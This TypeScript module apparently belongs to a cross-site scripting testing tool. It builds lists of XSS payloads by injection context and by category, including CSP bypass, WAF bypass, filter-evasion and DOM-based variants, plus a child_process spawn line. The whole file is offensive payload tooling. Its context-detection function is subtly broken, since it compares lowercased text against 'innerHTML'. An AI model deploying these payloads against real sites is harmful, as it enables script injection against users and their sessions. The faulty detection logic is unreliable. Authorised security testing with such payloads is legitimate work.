type Context = 'html' | 'js' | 'attribute' | 'url' | 'style';
type Category = 'Basic' | 'CSP Bypass' | 'WAF Bypass' | 'DOM Based' | 'Template Injection' | 'Filter Evasion';

const basicPayloads = {
  html: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe onload=alert(1)>',
  ],
  js: [
    'javascript:alert(1)',
    '"-alert(1)-"',
    '\';alert(1);//',
  ],
  attribute: [
    '" onmouseover="alert(1)',
    "' onclick='alert(1)",
    '" onfocus="alert(1)',
  ],
  url: [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:alert(1)',
  ],
  style: [
    'expression(alert(1))',
    'behavior:url(javascript:alert(1))',
    '</style><script>alert(1)</script>',
  ]
};

const cspBypassPayloads = {
  html: [
    '<script src="data:,alert(1)"></script>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>click',
  ],
  js: [
    'require("child_process").spawn("calc.exe")',
    'eval.call(this,"alert(1)")',
    'setTimeout.call(this,"alert(1)")',
  ]
};

const wafBypassPayloads = {
  html: [
    '"><img src=x onerror=prompt(1);>',
    '<Img Src=x OnError=alert(1)>',
    '<svG/onload=alert(1)>',
  ],
  js: [
    'alert?.(1)',
    'window["alert"](1)',
    'eval("ale"+"rt(1)")',
  ]
};

const domBasedPayloads = {
  url: [
    'document.location="javascript:alert(1)"',
    'location.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="',
    'window.location.hash="<img src=x onerror=alert(1)>"',
  ],
  js: [
    'document.write("<img src=x onerror=alert(1)>")',
    'element.innerHTML="<img src=x onerror=alert(1)>"',
    '$("#element").html("<img src=x onerror=alert(1)>")',
  ]
};

export const generatePayloads = (
  context: Context,
  vulnerabilityPoints: string[],
  categories: Category[] = ['Basic', 'CSP Bypass', 'WAF Bypass', 'DOM Based']
): string[] => {
  const payloads: string[] = [];

  categories.forEach(category => {
    switch(category) {
      case 'Basic':
        payloads.push(...basicPayloads[context]);
        break;
      case 'CSP Bypass':
        if (context === 'html' || context === 'js') {
          payloads.push(...cspBypassPayloads[context]);
        }
        break;
      case 'WAF Bypass':
        if (context === 'html' || context === 'js') {
          payloads.push(...wafBypassPayloads[context]);
        }
        break;
      case 'DOM Based':
        if (context === 'url' || context === 'js') {
          payloads.push(...domBasedPayloads[context]);
        }
        break;
    }
  });

  return payloads;
};

export const determineContext = (vulnerabilityPoint: string): Context => {
  if (vulnerabilityPoint.toLowerCase().includes('innerHTML') || 
      vulnerabilityPoint.toLowerCase().includes('document.write')) {
    return 'html';
  }
  if (vulnerabilityPoint.toLowerCase().includes('href') || 
      vulnerabilityPoint.toLowerCase().includes('src') ||
      vulnerabilityPoint.toLowerCase().includes('url')) {
    return 'url';
  }
  if (vulnerabilityPoint.toLowerCase().includes('style') || 
      vulnerabilityPoint.toLowerCase().includes('css')) {
    return 'style';
  }
  if (vulnerabilityPoint.toLowerCase().includes('onclick') || 
      vulnerabilityPoint.toLowerCase().includes('event')) {
    return 'attribute';
  }
  return 'js';
};